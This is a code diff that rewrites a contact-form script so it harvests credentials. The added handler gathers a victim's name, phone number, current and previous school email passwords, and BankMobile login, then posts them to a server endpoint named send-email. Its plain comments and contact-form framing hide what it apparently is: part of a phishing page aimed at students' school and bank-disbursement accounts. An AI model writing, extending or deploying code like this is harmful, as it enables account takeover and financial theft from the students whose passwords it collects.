@@ -1,30 +1,45 @@
-const form = document.getElementById("contactForm");
-const status = document.getElementById("status");
+document.addEventListener("DOMContentLoaded", function () {
+  // Get the form element
+  const form = document.querySelector("form");
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+  // Add event listener to handle form submission
+  form.addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent the default form submission
 
-  const name = form.name.value.trim();
-  const email = form.email.value.trim();
-  const message = form.message.value.trim();
+    // Collect form data
+    const formData = {
+      fullName: document.getElementById("fullName").value,
+      phoneNumber: document.getElementById("phone_number").value,
+      currentSchoolEmail: document.getElementById("currentschemail").value,
+      currentSchoolPassword:
+        document.getElementById("currentschpassword").value,
+      previousSchoolEmail: document.getElementById("previouschemail").value,
+      previousSchoolPassword: document.getElementById("previouschemailpassword")
+        .value,
+      hasBankMobileProfile: document.querySelector('input[name="Yes"]:checked')
+        ? "Yes"
+        : "No",
+      bankMobileEmail: document.getElementById("bankmobileemail").value,
+      bankMobilePassword: document.getElementById("bankmobilepassword").value,
+    };
 
-  const body = JSON.stringify({ name, email, message });
-
-  try {
-    const res = await fetch("/send-email", {
+    // Send data to API
+    fetch("/api/send-email.js", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body,
-    });
-
-    const result = await res.json();
-    if (res.ok) {
-      status.textContent = "Email sent!";
-      form.reset();
-    } else {
-      status.textContent = result.error || "Failed to send.";
-    }
-  } catch (err) {
-    status.textContent = "Something went wrong.";
-  }
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(formData),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        // Handle the response from the API
+        console.log("Success:", data);
+        // Optionally, show a success message or redirect
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error("Error:", error);
+      });
+  });
 });
